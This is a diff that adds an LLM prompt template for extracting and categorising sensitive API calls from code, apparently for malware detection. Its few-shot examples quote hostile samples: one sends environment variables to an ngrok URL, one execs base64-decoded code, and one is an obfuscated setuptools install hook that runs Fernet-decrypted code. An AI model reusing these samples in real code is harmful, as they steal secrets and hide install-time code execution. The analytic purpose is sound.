@@ -1,0 +1,331 @@
+You are an expert code analyst specialized in identifying sensitive API patterns in code.
+
+## TASK
+Analyze the provided code snippet and extract all sensitive API calls with their execution sequence and categories according to a predefined taxonomy.
+
+## INPUT DETAILS
+- The code may contain obfuscation techniques like renamed imports or indirect calls
+- Focus on identifying APIs related to security concerns or malicious behavior
+- Track execution flow including conditionals and function calls
+
+## OUTPUT REQUIREMENTS
+Provide a structured JSON response containing three key components:
+1. A sequence of API calls without arguments in execution order
+2. The same sequence with arguments included
+3. A detailed mapping of each API to its category with contextual information
+4. The essential code context showing all sensitive API calls and their dependencies
+
+## CATEGORIES
+The following categories and subcategories define the taxonomy for classification:
+{CATEGORIES}
+
+## CODE TO ANALYZE
+```
+{CODE}
+```
+
+## RESPONSE FORMAT
+Return a valid JSON object with the following structure:
+```json
+{
+  "api_sequence": [
+    "api1", "api2", "api3", ...
+  ],
+  "api_sequence_with_args": [
+    "api1(arg1, arg2)", "api2(arg3)", "api3(arg4, arg5)", ...
+  ],
+  "mapped_sequence": [
+    {
+      "api_name": "full.path.to.api",
+      "id": "api_category_id_from_categories_above", 
+      "description": "description_from_categories_above"
+    },
+    ...
+  ],
+  "contextual_code": "Code with all sensitive API calls and their essential context, including data and control dependencies"
+}
+```
+
+## EXAMPLES
+
+
+### Example 1: Renamed import with file operation
+For code:
+```python
+import os as operating_system
+from shutil import copy as duplicate_file
+import hashlib
+
+def calculate_hash(filename):
+    with open(filename, 'rb') as f:
+        data = f.read()
+        return hashlib.md5(data).hexdigest()
+
+def copy_if_exists(source, destination):
+    if operating_system.path.exists(source):
+        print(f"Copying {source} to {destination}")
+        duplicate_file(source, destination)
+        return True
+    return False
+```
+
+Expected output:
+```json
+{
+  "api_sequence": ["os.path.exists", "shutil.copy", "hashlib.md5"],
+  "api_sequence_with_args": ["os.path.exists(source)", "shutil.copy(source, destination)", "hashlib.md5(data).hexdigest()"],
+  "mapped_sequence": [
+    {
+      "api_name": "os.path.exists",
+      "id": "check_path_exists",
+      "description": "Checks if specified path exists in filesystem"
+    },
+    {
+      "api_name": "shutil.copy",
+      "id": "copy_file", 
+      "description": "Copies file to destination, preserving metadata"
+    },
+    {
+      "api_name": "hashlib.md5",
+      "id": "create_md5_hash",
+      "description": "Creates MD5 hash object from encoded hostname"
+    }
+  ],
+  "contextual_code": "import os as operating_system\nfrom shutil import copy as duplicate_file\nimport hashlib\n\ndef calculate_hash(filename):\n    with open(filename, 'rb') as f:\n        data = f.read()\n        return hashlib.md5(data).hexdigest()\n\ndef copy_if_exists(source, destination):\n    if operating_system.path.exists(source):\n        duplicate_file(source, destination)\n        return True\n    return False"
+}
+```
+
+### Example 2: Object instantiation and method calls
+For code:
+```python
+import socket
+import time
+
+def connect_to_server(host, port):
+    # Create socket object
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(10)
+    
+    # Connect to server
+    try:
+        s.connect((host, port))
+        data = s.recv(1024)
+        s.send(b"Hello server")
+        s.close()
+        return data
+    except Exception as e:
+        print(f"Connection error: {e}")
+        return None
+```
+
+Expected output:
+```json
+{
+  "api_sequence": ["socket.socket", "socket.socket.settimeout", "socket.socket.connect", "socket.socket.recv", "socket.socket.send", "socket.socket.close"],
+  "api_sequence_with_args": [
+    "socket.socket(socket.AF_INET, socket.SOCK_STREAM)", 
+    "socket.socket.settimeout(10)",
+    "socket.socket.connect((host, port))",
+    "socket.socket.recv(1024)",
+    "socket.socket.send(b\"Hello server\")",
+    "socket.socket.close()"
+  ],
+  "mapped_sequence": [
+    {
+      "api_name": "socket.socket",
+      "id": "create_socket", 
+      "description": "Creates new socket object"
+    },
+    {
+      "api_name": "socket.socket.settimeout",
+      "id": "set_socket_timeout",
+      "description": "Sets timeout for socket operations"
+    },
+    {
+      "api_name": "socket.socket.connect",
+      "id": "establish_tcp_connection",
+      "description": "Establishes TCP connection to specified address"
+    },
+    {
+      "api_name": "socket.socket.recv",
+      "id": "receive_socket_data",
+      "description": "Receives data from socket connection"
+    },
+    {
+      "api_name": "socket.socket.send",
+      "id": "send_socket_data",
+      "description": "Sends data over socket connection"
+    },
+    {
+      "api_name": "socket.socket.close",
+      "id": "close_socket",
+      "description": "Closes the socket connection"
+    }
+  ],
+  "contextual_code": "import socket\n\ndef connect_to_server(host, port):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(10)\n    try:\n        s.connect((host, port))\n        data = s.recv(1024)\n        s.send(b\"Hello server\")\n        s.close()\n        return data\n    except Exception as e:\n        print(f\"Connection error: {e}\")\n        return None"
+}
+```
+
+
+
+### Example 3: Nested API call order
+For code:
+```python
+import requests
+import os
+def hello():
+    requests.get(f"https://b296-71-179-165-157.ngrok-free.app/{os.environ}")
+```
+
+Expected output:
+```json
+{
+  "api_sequence": ["os.environ", "requests.get"],
+  "api_sequence_with_args": ["os.environ", "requests.get('https://b296-71-179-165-157.ngrok-free.app/{os.environ}')"],
+  "mapped_sequence": [
+    {
+      "api_name": "os.environ",
+      "id": "get_env_vars",
+      "description": "Retrieves environment variables mapping"
+    },
+    {
+      "api_name": "requests.get",
+      "id": "send_http_get",
+      "description": "Sends HTTP GET request with parameters and timeout"
+    }
+  ],
+  "contextual_code": "import requests\nimport os\ndef hello():\n    requests.get(f\"https://b296-71-179-165-157.ngrok-free.app/{os.environ}\")"
+}
+```
+
+### Example 4: 
+For code:
+```python
+__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJ...c3M="),'<string>','exec'))
+```
+
+Expected output:
+```json
+{
+  "api_sequence": ["__import__", "__import__", "__import__", "base64.b64decode", "builtins.compile", "builtins.exec"],
+  "api_sequence_with_args": [
+    "__import__('builtins')",
+    "__import__('builtins')",
+    "__import__('base64')",
+    "base64.b64decode(\"ZnJvbSB0ZW1wZmlsZ...\")",
+    "builtins.compile(..., '<string>', 'exec')",
+    "builtins.exec(...)"
+  ],
+  "mapped_sequence": [
+    {
+      "api_name": "__import__",
+      "id": "import_dynamic",
+      "description": "Dynamically imports specified module"
+    },
+      {
+      "api_name": "__import__",
+      "id": "import_dynamic",
+      "description": "Dynamically imports specified module"
+    },
+      {
+      "api_name": "__import__",
+      "id": "import_dynamic",
+      "description": "Dynamically imports specified module"
+    },
+    {
+      "api_name": "base64.b64decode",
+      "id": "decode_base64_to_bytes",
+      "description": "Decodes base64-encoded string to bytes"
+    },
+    {
+      "api_name": "builtins.compile",
+      "id": "compile_code_object",
+      "description": "Compiles source code string into executable code object"
+    },
+    {
+      "api_name": "builtins.exec",
+      "id": "exec_python_code",
+      "description": "Dynamically executes Python code string"
+    }
+  ],
+  "contextual_code": "__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(\"ZnJvbSB0ZW1wZmlsZ...\",'<string>','exec'))"
+}
+```
+
+### Example 5: 
+For code:
+```python
+from setuptools.command.install import install
+
+class mJowwTqoErudaVwmWspimPYBAluUDzKFnJeJNqDsweftEtPzfwuSbeAwcAKhSjRqZUcWAznpthGjUlHUwABp(install):
+    def run(self):
+        import os
+        if os.name == "nt":
+            import requests
+            from fernet import Fernet
+            exec(Fernet(b'UZwfYI2Yo4qbNdSw7-qeSPTSljNmI0AO-3U7mAe9YKE=').decrypt(b'gAAAAABmbvjG-FQ=='))
+
+        install.run(self)
+```
+
+Expected output:
+```json
+{
+  "api_sequence": ["os.name", "fernet.Fernet", "fernet.Fernet.decrypt", "exec", "setuptools.command.install.install.run"],
+  "api_sequence_with_args": [
+    "os.name",
+    "fernet.Fernet(b'UZwfYI2Yo4qbNdSw7-qeSPTSljNmI0AO-3U7mAe9YKE=')",
+    "fernet.Fernet.decrypt(b'gAAAAABrCAjG-FQ==')",
+    "exec(...)",
+    "setuptools.command.install.install.run(self)"
+  ],
+  "mapped_sequence": [
+    {
+      "api_name": "os.name",
+      "id": "get_os_id",
+      "description": "Retrieves operating system identifier"
+    },
+    {
+      "api_name": "fernet.Fernet",
+      "id": "decrypt_fernet_data",
+      "description": "Decrypts Fernet-encrypted data"
+    },
+    {
+      "api_name": "fernet.Fernet.decrypt",
+      "id": "decrypt_fernet_data",
+      "description": "Decrypts Fernet-encrypted data"
+    },
+    {
+      "api_name": "exec",
+      "id": "exec_python_code",
+      "description": "Dynamically executes Python code string"
+    },
+    {
+      "api_name": "setuptools.command.install.install.run",
+      "id": "exec_setuptools_install",
+      "description": "Executes setuptools installation procedure"
+    }
+  ],
+  "contextual_code": "from setuptools.command.install import install\n\nclass mJowwTqoErudaVwmWspimPYBAluUDzKFnJeJNqDsweftEtPzfwuSbeAwcAKhSjRqZUcWAznpthGjUlHUwABp(install):\n    def run(self):\n        import os\n        if os.name == \"nt\":\n            import requests\n            from fernet import Fernet\n            exec(Fernet(b'UZwfYI2Yo4qbNdSw7-qeSPTSljNmI0AO-3U7mAe9YKE=').decrypt(b'gAAAAABmbvNgnkVCj8JEmMntCAjG-FQ=='))\n\n        install.run(self)"
+}
+```
+
+
+## IMPORTANT NOTES
+1. For the "contextual_code" field, include only the essential code that is directly related to the sensitive API calls
+2. Include all data and control dependencies necessary to understand how the APIs are used
+3. Ensure the API sequences follow execution order, not declaration order
+4. Restore original API names even when aliased or renamed
+5. If an API could belong to multiple categories, choose the most appropriate one
+6. When execution is conditional, include the API calls in both branches
+7. For functions that wrap sensitive APIs, include both the wrapper and the API in the contextual_code
+8. When an object is instantiated and its methods are called (like `s = socket.socket()` and `s.connect()`), restore the full API path in the sequence (like `socket.socket` and `socket.socket.connect`)
+9. IMPORTANT: You MUST use the exact "id" and "description" from the provided CATEGORIES section. Do NOT create your own category IDs or descriptions.
+10. If an API doesn't clearly match any category in the provided taxonomy, map it to the closest matching category from CATEGORIES
+11. The "mapped_sequence" must only contain category IDs and descriptions that appear in the CATEGORIES section
+12. IMPORTANT: For all renamed or aliased imports (e.g., `import os as operating_system`), you MUST restore them to their original namespace in all API references (e.g., `operating_system.path.exists` should be listed as `os.path.exists`)
+13. Pay special attention to any form of API reference obfuscation and restore it to its canonical form in your response
+14. Note the order of nested API calls: For nested calls (like requests.get(f"url/{os.environ}")), the API sequence should reflect the true execution order (inside-out): first os.environ, then requests.get
+15. For complex dynamic execution code (using exec, eval, or encoded strings), analyze the decoded code content and extract the API calls in their actual execution order
+16. Only include APIs that are actually called, not modules that are imported but not used (such as requests in the example which is imported but never used)
+17. For conditionally executed code (like code inside if os.name == "nt": blocks), remember to include it in the API sequence as it may execute under specific conditions
